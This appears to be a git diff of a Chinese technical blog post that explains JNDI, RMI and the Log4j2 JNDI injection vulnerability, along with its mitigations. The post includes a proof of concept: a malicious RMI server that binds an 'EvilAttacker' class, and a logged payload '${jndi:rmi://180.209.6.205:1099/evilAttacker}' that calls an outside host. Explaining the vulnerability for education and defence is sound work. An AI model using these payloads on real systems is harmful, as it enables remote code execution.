@@ -22,7 +22,7 @@ date: 2021-12-12 22:18:36
   * **问题思考：JNDI与目前主流框架的配置文件的思想和原理是否类似**
   * 本人技术小白，欢迎大神交流指导
 
-![Violet](https://gitee.com/chthollists/PicRepo/raw/master/violet/Violet06.jpg)
+![Violet](https://gitee.com/chthollists/PicRepo/raw/master/chtholly/Chtholly12.jpg)
 
 <!-- more -->
 
@@ -71,9 +71,9 @@ date: 2021-12-12 22:18:36
 
     > ```xml
     > <File name="Application" fileName="application.log">
-    >     <PatternLayout>
-    >         <pattern>%d %p %c{1.} [%t] $${jndi:logging/context-name} %m%n</pattern>
-    >     </PatternLayout>
+    >        <PatternLayout>
+    >            <pattern>%d %p %c{1.} [%t] $${jndi:logging/context-name} %m%n</pattern>
+    >        </PatternLayout>
     > </File>
     > ```
 
@@ -127,19 +127,19 @@ date: 2021-12-12 22:18:36
     > ```java
     > Connection conn = null;
     > try {
-    >     Class.forName("com.mysql.jdbc.Driver");
-    >     conn = DriverManager.getConnection("jdbc:mysql://mysql_IP?user=xxx&password=xxx");
-    >     // use MySQL
+    >        Class.forName("com.mysql.jdbc.Driver");
+    >        conn = DriverManager.getConnection("jdbc:mysql://mysql_IP?user=xxx&password=xxx");
+    >        // use MySQL
     > }catch (Exception e) {
-    >     e.printStackTrace();
+    >        e.printStackTrace();
     > }finally {
-    >     if(conn != null) {
-    >         try {
-    >             conn.close();
-    >         }catch (SQLException e) {
-    >             e.printStackTrace();
-    >         }
-    >     }
+    >        if(conn != null) {
+    >            try {
+    >                conn.close();
+    >            }catch (SQLException e) {
+    >                e.printStackTrace();
+    >            }
+    >        }
     > }
     > ```
 
@@ -149,24 +149,24 @@ date: 2021-12-12 22:18:36
     > // 无需修改代码
     > Connection conn = null;
     > try {
-    >     // 获取上下文对象
-    >     Context context = new InitialContext();
-    >     // 获取JNDI名称对应的数据源对象，jndiName如mysql-jndi
-    >     Object dataSourceObj = context.lookup("java:jndiName");
-    >     // 类型转换，获取数据源对象
-    >     DataSource dataSource = (DataSource) dataSourceObj;
-    >     conn = dataSource.getConnection();
-    >     // use MySQL
+    >        // 获取上下文对象
+    >        Context context = new InitialContext();
+    >        // 获取JNDI名称对应的数据源对象，jndiName如mysql-jndi
+    >        Object dataSourceObj = context.lookup("java:jndiName");
+    >        // 类型转换，获取数据源对象
+    >        DataSource dataSource = (DataSource) dataSourceObj;
+    >        conn = dataSource.getConnection();
+    >        // use MySQL
     > }catch (Exception e) {
-    >     e.printStackTrace();
+    >        e.printStackTrace();
     > }finally {
-    >     if(conn != null) {
-    >         try {
-    >             conn.close();
-    >         }catch (SQLException e) {
-    >             e.printStackTrace();
-    >         }
-    >     }
+    >        if(conn != null) {
+    >            try {
+    >                conn.close();
+    >            }catch (SQLException e) {
+    >                e.printStackTrace();
+    >            }
+    >        }
     > }
     > ```
 
@@ -194,19 +194,19 @@ date: 2021-12-12 22:18:36
 
     > ```java
     > public class RegistryService {
-    >     public static void main(String[] args) {
-    >         try {
-    >             // 本地主机上的远程对象注册表Registry的实例,默认端口1099
-    >             Registry registry = LocateRegistry.createRegistry(1099);
-    >             // 创建一个远程对象
-    >             HelloRegistryFacade hello = new HelloRegistryFacadeImpl();
-    >             // 把远程对象注册到RMI注册服务器上，并命名为HelloRegistry
-    >             registry.rebind("HelloRegistry", hello);
-    >             System.out.println("======= 启动RMI服务成功! =======");
-    >         } catch (RemoteException e) {
-    >             e.printStackTrace();
-    >         }
-    >     }
+    >        public static void main(String[] args) {
+    >            try {
+    >                // 本地主机上的远程对象注册表Registry的实例,默认端口1099
+    >                Registry registry = LocateRegistry.createRegistry(1099);
+    >                // 创建一个远程对象
+    >                HelloRegistryFacade hello = new HelloRegistryFacadeImpl();
+    >                // 把远程对象注册到RMI注册服务器上，并命名为HelloRegistry
+    >                registry.rebind("HelloRegistry", hello);
+    >                System.out.println("======= 启动RMI服务成功! =======");
+    >            } catch (RemoteException e) {
+    >                e.printStackTrace();
+    >            }
+    >        }
     > }
     > ```
 
@@ -215,19 +215,19 @@ date: 2021-12-12 22:18:36
     > ```java
     > // 接口
     > public interface HelloRegistryFacade extends Remote {
-    >     String helloWorld(String name) throws RemoteException;
+    >        String helloWorld(String name) throws RemoteException;
     > }
     > 
     > // 实现类，继承 UnicastRemoteObject
     > public class HelloRegistryFacadeImpl extends UnicastRemoteObject implements HelloRegistryFacade{
-    >     public HelloRegistryFacadeImpl() throws RemoteException {
-    >         super();
-    >     }
+    >        public HelloRegistryFacadeImpl() throws RemoteException {
+    >            super();
+    >        }
     >     
-    >     @Override
-    >     public String helloWorld(String name) {
-    >         return "[Registry] 你好!" + name;
-    >     }
+    >        @Override
+    >        public String helloWorld(String name) {
+    >            return "[Registry] 你好!" + name;
+    >        }
     > }
     > ```
 
@@ -235,16 +235,16 @@ date: 2021-12-12 22:18:36
 
     > ```java
     > public class RegistryClient {
-    >     public static void main(String[] args) {
-    >         try {
-    >             Registry registry = LocateRegistry.getRegistry(1099);
-    >             HelloRegistryFacade hello = (HelloRegistryFacade) registry.lookup("HelloRegistry");
-    >             String response = hello.helloWorld("RMI远程调用~~~");
-    >             System.out.println("=======> " + response + " <=======");
-    >         } catch (NotBoundException | RemoteException e) {
-    >             e.printStackTrace();
-    >         }
-    >     }
+    >        public static void main(String[] args) {
+    >            try {
+    >                Registry registry = LocateRegistry.getRegistry(1099);
+    >                HelloRegistryFacade hello = (HelloRegistryFacade) registry.lookup("HelloRegistry");
+    >                String response = hello.helloWorld("RMI远程调用~~~");
+    >                System.out.println("=======> " + response + " <=======");
+    >            } catch (NotBoundException | RemoteException e) {
+    >                e.printStackTrace();
+    >            }
+    >        }
     > }
     > ```
 
@@ -273,20 +273,19 @@ date: 2021-12-12 22:18:36
 * `Log4j2`漏洞原理
 
   * `Log4j2`的`Lookup`
-
     * Log4j2的漏洞版本中，可以通过lookup功能向其配置文件的任意位置注入代码，该功能允许开发者通过一些协议去读取相应环境中的配置，但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生
     * 注入的方式类似 SQL 注入，即把变量替换为{实际代码}
     * 再加上这些版本中用到的 JNDI 特性并没有为 LDAP、RMI 提供足够的保护，使得注入的任意代码都能被肆无忌惮地执行
-
+    
   * JNDI注入攻击：主要是通过LDAP、RMI两种方式
-
+  
     * Java支持通过JNDI的方式去远程访问、请求对应的数据，访问普通数据时不会有风险，但是访问对象时会有风险
     * Java对象一般只存在于内存中，但也可以通过序列化的方式将其存储到文件中，或者通过网络传输
     * Java支持过JNDI的方式去远程去访问、下载一个class文件，并加载、构建该对象，主要的具体实现有LDAP、RMI等
     * 当Java对象比较大时，直接通过LDAP存储不方便，而是通过类似二次跳转的方式，不直接返回对象内容，而是跳转到该对象所在的class文件查找
-
+  
     * 如果远程下载的URL指向的是一个黑客的服务器，并且下载的class文件里面藏有恶意代码，就可以进行恶意攻击
-
+  
 * 漏洞举例
 
   * 在使用Log4j2打印日志时，如果发现日志内容中包含关键词`${...}`
@@ -335,15 +334,15 @@ date: 2021-12-12 22:18:36
     > import java.util.Hashtable;
     > 
     > public class EvilAttacker implements ObjectFactory {
-    >     static {
-    >         System.out.println("远程调用的类：模拟黑客攻击！！！");
-    >         System.out.println("加载、执行外部的远程类，可以恶意攻击！！！");
-    >     }
+    >        static {
+    >            System.out.println("远程调用的类：模拟黑客攻击！！！");
+    >            System.out.println("加载、执行外部的远程类，可以恶意攻击！！！");
+    >        }
     > 
-    >     @Override
-    >     public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
-    >         return null;
-    >     }
+    >        @Override
+    >        public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
+    >            return null;
+    >        }
     > }
     > ```
 
@@ -360,18 +359,18 @@ date: 2021-12-12 22:18:36
     > 
     > public class RMIServer {
     > 
-    >     public static void main(String[] args) {
-    >         try {
-    >             Registry registry = LocateRegistry.createRegistry(1099);
-    >             // LocateRegistry.getRegistry()
-    >             System.out.println("Create a RMI registry on port 1099");
-    >             Reference reference = new Reference("com.log4j2.rmi.EvilAttacker", "com.log4j2.rmi.EvilAttacker", null);
-    >             ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
-    >             registry.bind("evilAttacker", referenceWrapper);
-    >         } catch (Exception e) {
-    >             e.printStackTrace();
-    >         }
-    >     }
+    >        public static void main(String[] args) {
+    >            try {
+    >                Registry registry = LocateRegistry.createRegistry(1099);
+    >                // LocateRegistry.getRegistry()
+    >                System.out.println("Create a RMI registry on port 1099");
+    >                Reference reference = new Reference("com.log4j2.rmi.EvilAttacker", "com.log4j2.rmi.EvilAttacker", null);
+    >                ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
+    >                registry.bind("evilAttacker", referenceWrapper);
+    >            } catch (Exception e) {
+    >                e.printStackTrace();
+    >            }
+    >        }
     > }
     > 
     > ```
@@ -430,19 +429,19 @@ date: 2021-12-12 22:18:36
     > import org.apache.logging.log4j.Logger;
     > 
     > public class Log4jTest {
-    >     private static final Logger LOGGER = LogManager.getLogger();
+    >        private static final Logger LOGGER = LogManager.getLogger();
     > 
-    >     public static void main(String[] args) {
-    >         String password = "666666";
-    >         LOGGER.info("password: {}", password);
-    >         password = "${java:os}";
-    >         LOGGER.info("password: {}", password);
-    >         password = "${java:vm}";
-    >         LOGGER.info("password: {}", password);
+    >        public static void main(String[] args) {
+    >            String password = "666666";
+    >            LOGGER.info("password: {}", password);
+    >            password = "${java:os}";
+    >            LOGGER.info("password: {}", password);
+    >            password = "${java:vm}";
+    >            LOGGER.info("password: {}", password);
     > 
-    >         String username = "${jndi:rmi://180.209.6.205:1099/evilAttacker}";
-    >         LOGGER.info("username: {}", username);
-    >     }
+    >            String username = "${jndi:rmi://180.209.6.205:1099/evilAttacker}";
+    >            LOGGER.info("username: {}", username);
+    >        }
     > }
     > ```
 
@@ -496,7 +495,7 @@ date: 2021-12-12 22:18:36
     > </properties>
     > ```
     
-    ![Issue讨论](https://gitee.com/chthollists/PicRepo/raw/master/Technology/log4j2/Issue%E8%AE%A8%E8%AE%BA.bmp)
+    ![Issue讨论](https://gitee.com/chthollists/PicRepo/raw/master/Technology/log4j2/Issue%E8%AE%A8%E8%AE%BA.png)
   
 * 紧急修复措施：修改配置，关闭Lookup功能来缓解漏洞
 
@@ -510,7 +509,7 @@ date: 2021-12-12 22:18:36
 
     > `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`
 
-    ![解决方案](https://gitee.com/chthollists/PicRepo/raw/master/Technology/log4j2/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.bmp)
+    ![解决方案](https://gitee.com/chthollists/PicRepo/raw/master/Technology/log4j2/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.png)
 
 * 其他措施(实际不可用)：升级JDK版本，限制JNDI
 
